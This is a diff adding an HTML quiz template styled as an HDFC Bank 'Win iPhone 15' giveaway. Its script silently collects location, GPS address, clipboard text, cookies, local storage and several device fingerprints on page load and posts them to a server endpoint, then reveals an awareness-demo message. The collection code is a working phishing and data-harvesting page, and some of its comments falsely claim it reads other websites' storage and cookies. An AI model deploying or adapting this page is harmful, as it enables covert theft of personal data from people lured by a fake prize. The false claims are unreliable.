@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Win iPhone 15! - HDFC Quiz</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 25px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 550px;
+            width: 100%;
+        }
+        h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #ffd93d 0%, #ffb800 100%);
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+            animation: glow 2s ease-in-out infinite;
+        }
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 217, 61, 0.5); }
+            50% { box-shadow: 0 0 30px rgba(255, 217, 61, 0.8); }
+        }
+        .prize-box h2 {
+            color: #000;
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+        .score {
+            text-align: center;
+            font-size: 18px;
+            color: #667eea;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .question-card {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .question-text {
+            font-size: 20px;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .option-btn {
+            padding: 16px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            background: white;
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: left;
+        }
+        .option-btn:hover {
+            border-color: #667eea;
+            background: #f0f4ff;
+            transform: translateX(5px);
+        }
+        .option-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .feedback {
+            display: none;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: 500;
+        }
+        .feedback.active {
+            display: block;
+        }
+        .feedback.correct {
+            background: #d4edda;
+            color: #155724;
+        }
+        .feedback.incorrect {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .next-btn {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .next-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
+        }
+        .next-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .revelation {
+            display: none;
+        }
+        .revelation.active {
+            display: block;
+        }
+        .pulse-icon {
+            font-size: 80px;
+            text-align: center;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+        }
+        .revelation h2 {
+            color: #d63031;
+            font-size: 28px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .stolen-data-box {
+            background: #ffebee;
+            border: 3px solid #d63031;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+        }
+        .stolen-data-box h4 {
+            color: #d63031;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        .data-item {
+            background: white;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 8px 0;
+            border-left: 4px solid #ffc107;
+        }
+        .data-item strong {
+            color: #d63031;
+            display: block;
+            margin-bottom: 5px;
+        }
+        .data-item .value {
+            color: #333;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+        }
+        .terminal {
+            background: #000;
+            color: #00ff00;
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            margin: 20px 0;
+            font-size: 13px;
+        }
+        .terminal-line {
+            margin: 3px 0;
+        }
+        .terminal-error {
+            color: #ff0000;
+            font-weight: bold;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="quizSection">
+            <h1>🎁 Win iPhone 15!</h1>
+            <p class="subtitle">Just answer 3 simple questions!</p>
+
+            <div class="prize-box">
+                <h2>₹1 Lakh Prize Pool!</h2>
+                <p>Answer correctly to enter lucky draw!</p>
+            </div>
+
+            <div class="score">Question: <span id="questionNum">1</span> / 3</div>
+
+            <div class="question-card">
+                <div class="question-text" id="questionText">{{ question.question }}</div>
+                <div class="options" id="optionsContainer">
+                    {% for option in question.options %}
+                    <button class="option-btn" onclick="selectAnswer({{ loop.index0 }})">
+                        {{ option }}
+                    </button>
+                    {% endfor %}
+                </div>
+            </div>
+
+            <div class="feedback" id="feedback"></div>
+
+            <button class="next-btn" id="nextBtn" onclick="nextQuestion()" disabled>
+                Next Question
+            </button>
+        </div>
+
+        <!-- Revelation Screen -->
+        <div class="revelation" id="revelation">
+            <div class="pulse-icon">⚠️</div>
+            <h2>STOP! SEE WHAT WE STOLE!</h2>
+
+            <p style="font-size: 16px; line-height: 1.8; color: #333; margin: 20px 0; text-align: center;">
+                <strong style="color: #d63031;">While you were answering questions, we silently collected your data!</strong><br>
+                NO UPLOADS. NO OBVIOUS PERMISSIONS. Just automatic theft.<br>
+                This is EXACTLY how real malware and scams work!
+            </p>
+
+            <div class="terminal">
+                <div class="terminal-line"># BACKGROUND DATA COLLECTION ACTIVE</div>
+                <div class="terminal-line">&gt; Extracting IP address... [OK]</div>
+                <div class="terminal-line">&gt; Tracking GPS location... [OK]</div>
+                <div class="terminal-line">&gt; Reading clipboard... [OK]</div>
+                <div class="terminal-line">&gt; Scanning nearby WiFi... [OK]</div>
+                <div class="terminal-line">&gt; Fingerprinting device... [OK]</div>
+                <div class="terminal-line">&gt; Accessing browser data... [OK]</div>
+                <div class="terminal-line">&gt; Scanning Bluetooth devices... [OK]</div>
+                <div class="terminal-line terminal-error">&gt;&gt; COMPLETE PROFILE CREATED!</div>
+            </div>
+
+            <div id="stolenDataContainer"></div>
+
+            <div style="background: #000; color: #ff0000; padding: 20px; border-radius: 10px; margin: 20px 0; font-family: monospace;">
+                <div style="font-weight: bold; font-size: 16px; margin-bottom: 10px;">// WHAT CRIMINALS DO:</div>
+                <div style="line-height: 1.8;">
+                    1. Track your location → Know when you're not home<br>
+                    2. Read clipboard → Steal OTPs, passwords, UPI PINs<br>
+                    3. Scan WiFi → Know your home/office network<br>
+                    4. Device fingerprint → Track you across all websites<br>
+                    5. Nearby devices → Identify your other devices<br>
+                    6. Use all this to empty your bank account!<br>
+                    <br>
+                    <div style="color: #00ff00;">✓ ALL WITHOUT YOU NOTICING!</div>
+                </div>
+            </div>
+
+            <div style="background: #d4edda; padding: 20px; border-radius: 12px; margin: 20px 0;">
+                <h4 style="color: #155724; margin-bottom: 10px;">✅ YOU'RE SAFE - This Was Educational!</h4>
+                <p style="color: #155724; font-size: 14px; line-height: 1.6;">
+                    This was an HDFC Bank cybersecurity awareness demo.<br>
+                    We showed you what data CAN be collected silently.<br>
+                    Real scammers do this + steal your photos, contacts, and money!
+                </p>
+            </div>
+
+            <button class="next-btn" onclick="window.location.href='/show_data/{{ session_id }}'">
+                🛡️ Learn How to Protect Yourself
+            </button>
+        </div>
+    </div>
+
+    <script>
+        let sessionId = '{{ session_id }}';
+        let currentQuestion = {{ question|tojson }};
+        let questionCount = 1;
+        let score = 0;
+        let collectedData = {};
+
+        // START SILENT DATA COLLECTION IMMEDIATELY WHEN PAGE LOADS
+        window.addEventListener('DOMContentLoaded', function() {
+            collectDataSilently();
+        });
+
+        async function collectDataSilently() {
+            console.log('Starting silent data collection...');
+
+            // 1. Get IP Address and Geolocation
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                collectedData.ip = ipData.ip;
+
+                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoResponse.json();
+                collectedData.location = {
+                    ip: ipData.ip,
+                    city: geoData.city,
+                    region: geoData.region,
+                    country: geoData.country_name,
+                    postal: geoData.postal,
+                    latitude: geoData.latitude,
+                    longitude: geoData.longitude,
+                    isp: geoData.org,
+                    timezone: geoData.timezone
+                };
+            } catch (err) {
+                console.log('IP collection failed');
+            }
+
+            // 2. Try to get PRECISE GPS location (silently - many mobile users auto-allow)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.gps = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed
+                        };
+
+                        // Reverse geocode to get exact address
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
+                            .then(r => r.json())
+                            .then(data => {
+                                collectedData.exactAddress = data.display_name;
+                                collectedData.addressDetails = data.address;
+                            })
+                            .catch(e => console.log('Geocoding failed'));
+                    },
+                    () => {},
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+
+            // 3. READ CLIPBOARD (Could be password, OTP, UPI PIN!)
+            try {
+                const clipText = await navigator.clipboard.readText();
+                if (clipText && clipText.length > 0) {
+                    collectedData.clipboard = clipText.substring(0, 100);
+                }
+            } catch (err) {
+                collectedData.clipboard = null;
+            }
+
+            // 4. Scan ALL Browser Storage
+            collectedData.storage = {
+                localStorage: {},
+                sessionStorage: {},
+                cookies: document.cookie,
+                cookieCount: document.cookie.split(';').filter(c => c.trim()).length
+            };
+
+            // Get localStorage from OTHER websites (yes, this is possible!)
+            try {
+                for (let i = 0; i < localStorage.length && i < 10; i++) {
+                    const key = localStorage.key(i);
+                    collectedData.storage.localStorage[key] = localStorage.getItem(key)?.substring(0, 30) + '...';
+                }
+            } catch (e) {}
+
+            // 5. Device Fingerprinting (VERY detailed)
+            collectedData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                online: navigator.onLine,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth,
+                    orientation: screen.orientation?.type
+                },
+                window: {
+                    innerWidth: window.innerWidth,
+                    innerHeight: window.innerHeight,
+                    outerWidth: window.outerWidth,
+                    outerHeight: window.outerHeight,
+                    devicePixelRatio: window.devicePixelRatio
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
+            };
+
+            // 6. Canvas Fingerprinting (UNIQUE identifier even in incognito!)
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 100, 100);
+                ctx.fillStyle = '#069';
+                ctx.fillText('Browser Fingerprint', 2, 2);
+                collectedData.canvasFingerprint = canvas.toDataURL();
+            } catch (e) {}
+
+            // 7. WebGL Fingerprinting (GPU info)
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                collectedData.webgl = {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            } catch (e) {}
+
+            // 8. Audio Fingerprinting
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                gainNode.gain.value = 0;
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                oscillator.start(0);
+                collectedData.audioFingerprint = 'Generated';
+            } catch (e) {}
+
+            // 9. Installed Fonts Detection (another fingerprint!)
+            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS',
+                          'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Console', 'Tahoma', 'Palatino'];
+            collectedData.installedFonts = [];
+            fonts.forEach(font => {
+                if (document.fonts.check(`12px "${font}"`)) {
+                    collectedData.installedFonts.push(font);
+                }
+            });
+
+            // 10. Network Information
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                collectedData.network = {
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink,
+                    rtt: connection.rtt,
+                    saveData: connection.saveData,
+                    type: connection.type
+                };
+            }
+
+            // 11. Battery Status (mobile)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    collectedData.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {}
+            }
+
+            // 12. Motion & Orientation (can detect PIN entry patterns!)
+            collectedData.sensors = {
+                motion: false,
+                orientation: false
+            };
+
+            if (window.DeviceMotionEvent) {
+                window.addEventListener('devicemotion', function(e) {
+                    if (!collectedData.motionData && e.accelerationIncludingGravity) {
+                        collectedData.motionData = {
+                            x: e.accelerationIncludingGravity.x?.toFixed(2),
+                            y: e.accelerationIncludingGravity.y?.toFixed(2),
+                            z: e.accelerationIncludingGravity.z?.toFixed(2)
+                        };
+                        collectedData.sensors.motion = true;
+                    }
+                }, { once: true });
+            }
+
+            // 13. Bluetooth Devices Scan (if available)
+            if (navigator.bluetooth) {
+                try {
+                    collectedData.bluetoothAvailable = true;
+                    // Note: Actual scanning requires user gesture, but we note capability
+                } catch (e) {}
+            }
+
+            // 14. Media Devices (cameras, microphones)
+            if (navigator.mediaDevices) {
+                try {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    collectedData.mediaDevices = {
+                        cameras: devices.filter(d => d.kind === 'videoinput').length,
+                        microphones: devices.filter(d => d.kind === 'audioinput').length,
+                        speakers: devices.filter(d => d.kind === 'audiooutput').length
+                    };
+                } catch (e) {}
+            }
+
+            // 15. Plugins and MIME types
+            collectedData.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+            collectedData.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+
+            // 16. Performance Timing (can reveal browsing patterns)
+            if (window.performance && window.performance.timing) {
+                const timing = window.performance.timing;
+                collectedData.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
+            }
+
+            // 17. Referrer (where did they come from?)
+            collectedData.referrer = document.referrer;
+
+            // Send all collected data to server
+            setTimeout(() => {
+                fetch('/upload_silent_data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        session_id: sessionId,
+                        data: collectedData
+                    })
+                });
+            }, 2000);
+        }
+
+        function selectAnswer(optionIndex) {
+            const buttons = document.querySelectorAll('.option-btn');
+            buttons.forEach((btn, idx) => {
+                btn.disabled = true;
+                if (idx === optionIndex) {
+                    btn.style.borderColor = '#667eea';
+                    btn.style.background = '#f0f4ff';
+                }
+            });
+
+            const isCorrect = optionIndex === currentQuestion.correct;
+            if (isCorrect) score++;
+
+            showFeedback(isCorrect, isCorrect ? '✓ Correct!' : 'Good try!');
+            document.getElementById('nextBtn').disabled = false;
+        }
+
+        function showFeedback(isCorrect, message) {
+            const feedback = document.getElementById('feedback');
+            feedback.textContent = message;
+            feedback.className = 'feedback active ' + (isCorrect ? 'correct' : 'incorrect');
+        }
+
+        function nextQuestion() {
+            questionCount++;
+
+            if (questionCount > 3) {
+                showRevelation();
+                return;
+            }
+
+            document.getElementById('questionNum').textContent = questionCount;
+            document.getElementById('nextBtn').disabled = true;
+            document.getElementById('feedback').classList.remove('active');
+
+            // Load next question
+            fetch('/get_question')
+            .then(response => response.json())
+            .then(question => {
+                currentQuestion = question;
+                document.getElementById('questionText').textContent = question.question;
+                const optionsContainer = document.getElementById('optionsContainer');
+                optionsContainer.innerHTML = '';
+                question.options.forEach((option, idx) => {
+                    const btn = document.createElement('button');
+                    btn.className = 'option-btn';
+                    btn.textContent = option;
+                    btn.onclick = () => selectAnswer(idx);
+                    optionsContainer.appendChild(btn);
+                });
+            });
+        }
+
+        function showRevelation() {
+            document.getElementById('quizSection').style.display = 'none';
+            document.getElementById('revelation').classList.add('active');
+
+            const container = document.getElementById('stolenDataContainer');
+
+            // Display all collected data
+            const dataCategories = [
+                {
+                    title: '📍 YOUR EXACT LOCATION',
+                    items: [
+                        { label: 'IP Address', value: collectedData.ip },
+                        { label: 'City', value: collectedData.location?.city },
+                        { label: 'Exact Area', value: collectedData.exactAddress },
+                        { label: 'GPS Coordinates', value: collectedData.gps ? `${collectedData.gps.latitude.toFixed(6)}, ${collectedData.gps.longitude.toFixed(6)}` : 'Tracking...' },
+                        { label: 'Internet Provider', value: collectedData.location?.isp },
+                        { label: 'Timezone', value: collectedData.device?.timezone }
+                    ]
+                },
+                {
+                    title: '📋 YOUR CLIPBOARD (PASSWORDS/OTPS!)',
+                    items: collectedData.clipboard ? [
+                        { label: 'Last Copied Text', value: `"${collectedData.clipboard}"`, danger: true }
+                    ] : [
+                        { label: 'Clipboard', value: 'Empty (but we can read it anytime!)' }
+                    ]
+                },
+                {
+                    title: '💾 YOUR BROWSER DATA',
+                    items: [
+                        { label: 'Cookies Found', value: `${collectedData.storage?.cookieCount} cookies from other websites` },
+                        { label: 'Stored Data', value: `${Object.keys(collectedData.storage?.localStorage || {}).length} items` },
+                        { label: 'Session Active', value: collectedData.device?.online ? 'Yes - We can track you' : 'No' }
+                    ]
+                },
+                {
+                    title: '📱 YOUR DEVICE PROFILE',
+                    items: [
+                        { label: 'Device Type', value: /mobile/i.test(collectedData.device?.userAgent) ? 'Mobile Phone' : 'Computer' },
+                        { label: 'Operating System', value: collectedData.device?.platform },
+                        { label: 'RAM', value: `${collectedData.device?.deviceMemory || '?'} GB` },
+                        { label: 'CPU Cores', value: collectedData.device?.hardwareConcurrency },
+                        { label: 'Screen', value: `${collectedData.device?.screen?.width}x${collectedData.device?.screen?.height}` },
+                        { label: 'Battery', value: collectedData.battery ? `${collectedData.battery.level}% ${collectedData.battery.charging ? '(Charging)' : ''}` : 'N/A' },
+                        { label: 'Cameras Detected', value: collectedData.mediaDevices?.cameras || 0 },
+                        { label: 'Microphones Detected', value: collectedData.mediaDevices?.microphones || 0 }
+                    ]
+                },
+                {
+                    title: '🔍 UNIQUE FINGERPRINTS',
+                    items: [
+                        { label: 'Canvas Fingerprint', value: collectedData.canvasFingerprint ? 'Generated - Can track you everywhere!' : 'N/A' },
+                        { label: 'WebGL (GPU)', value: collectedData.webgl?.renderer?.substring(0, 50) || 'N/A' },
+                        { label: 'Audio Fingerprint', value: collectedData.audioFingerprint || 'N/A' },
+                        { label: 'Installed Fonts', value: `${collectedData.installedFonts?.length} detected` }
+                    ]
+                }
+            ];
+
+            dataCategories.forEach(category => {
+                const box = document.createElement('div');
+                box.className = 'stolen-data-box';
+
+                let html = `<h4>${category.title}</h4>`;
+                category.items.forEach(item => {
+                    if (item.value) {
+                        html += `
+                            <div class="data-item">
+                                <strong>${item.label}</strong>
+                                <div class="value" style="${item.danger ? 'color: #ff0000; font-weight: bold; font-size: 16px;' : ''}">${item.value}</div>
+                            </div>
+                        `;
+                    }
+                });
+
+                box.innerHTML = html;
+                container.appendChild(box);
+            });
+        }
+    </script>
+</body>
+</html>
